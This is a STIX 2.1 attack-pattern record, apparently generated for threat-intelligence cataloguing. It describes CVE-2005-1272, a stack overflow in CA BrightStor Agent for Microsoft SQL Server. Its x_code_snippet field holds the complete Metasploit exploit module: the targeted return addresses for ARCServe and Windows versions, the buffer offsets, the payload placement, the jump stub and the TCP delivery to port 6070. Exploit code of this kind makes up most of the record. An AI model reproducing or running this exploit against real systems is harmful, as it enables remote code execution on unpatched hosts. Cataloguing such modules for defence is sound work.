{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ccc5d8bf-d4cc-4352-8942-57c969c357f6",
    "created": "2024-08-14T16:48:23.723792Z",
    "modified": "2024-08-14T16:48:23.723796Z",
    "name": "CA BrightStor Agent for Microsoft SQL Overflow",
    "description": " This module exploits a vulnerability in the CA BrightStor Agent for Microsoft SQL Server. This vulnerability was discovered by cybertronic[at]gmx.net. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/sql_agent.rb",
            "external_id": "sql_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1272"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor Agent for Microsoft SQL Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the CA BrightStor\n        Agent for Microsoft SQL Server. This vulnerability was\n        discovered by cybertronic[at]gmx.net.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-1272'],\n          [ 'OSVDB', '18501' ],\n          [ 'BID', '14453'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities'],\n          [ 'URL', 'http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          # This exploit requires a jmp esp for return\n          ['ARCServe 11.0 Asbrdcst.dll 12/12/2003',     { 'Platform' => 'win', 'Ret' => 0x20c11d64 }], # jmp esp\n          ['ARCServe 11.1 Asbrdcst.dll 07/21/2004',     { 'Platform' => 'win', 'Ret' => 0x20c0cd5b }], # push esp, ret\n          ['ARCServe 11.1 SP1 Asbrdcst.dll 01/14/2005', { 'Platform' => 'win', 'Ret' => 0x20c0cd1b }], # push esp, ret\n\n          # Generic jmp esp's\n          ['Windows 2000 SP0-SP3 English',              { 'Platform' => 'win', 'Ret' => 0x7754a3ab }], # jmp esp\n          ['Windows 2000 SP4 English',                  { 'Platform' => 'win', 'Ret' => 0x7517f163 }], # jmp esp\n          ['Windows XP SP0-SP1 English',                { 'Platform' => 'win', 'Ret' => 0x71ab1d54 }], # push esp, ret\n          ['Windows XP SP2 English',                    { 'Platform' => 'win', 'Ret' => 0x71ab9372 }], # push esp, ret\n          ['Windows 2003 SP0 English',                  { 'Platform' => 'win', 'Ret' => 0x71c03c4d }], # push esp, ret\n          ['Windows 2003 SP1 English',                  { 'Platform' => 'win', 'Ret' => 0x71c033a0 }], # push esp, ret\n        ],\n      'DisclosureDate' => '2005-08-02',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6070)\n      ])\n  end\n\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    # The 'one line' request does not work against Windows 2003\n    1.upto(5) { |i|\n\n      # Flush some memory\n      connect\n      begin\n        sock.put(\"\\xff\" * 0x12000)\n        sock.get_once\n      rescue\n      end\n      disconnect\n\n\n      # 3288 bytes max\n      #  696 == good data (1228 bytes contiguous) @ 0293f5e0\n      # 3168 == return address\n      # 3172 == esp @ 0293ff8c (2476 from good data)\n\n      buf = rand_text_english(3288, payload_badchars)\n      buf[ 696, payload.encoded.length ] = payload.encoded\n      buf[3168, 4] = [target.ret].pack('V')  # jmp esp\n      buf[3172, 5] = \"\\xe9\\x4f\\xf6\\xff\\xff\"  # jmp -2476\n\n      connect\n      begin\n        sock.put(buf)\n        sock.get_once\n      rescue\n      end\n\n      handler\n      disconnect\n    }\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-02",
    "x_mitre_platforms": [
        "%w{ win }"
    ]
}